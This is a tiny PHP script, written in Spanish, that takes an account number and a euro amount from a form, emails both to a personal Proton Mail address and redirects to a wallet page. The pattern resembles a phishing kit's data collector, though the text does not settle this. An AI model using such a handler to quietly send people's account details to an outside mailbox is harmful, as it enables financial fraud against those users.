<?php 
	$destino= "Rayelus@proton.me";
	$numbercode= $_POST["numbercode"];
	$cantidadeuro= $_POST["cantidadeuro"];
	$contenido= "Cuenta: " . $numbercode . "\nCantidad (EUR): " . $cantidadeuro;
	mail($destino,"Ingresar EUR ", $contenido);
	header("Location:../html/wallet/destino/addeur.html");


?>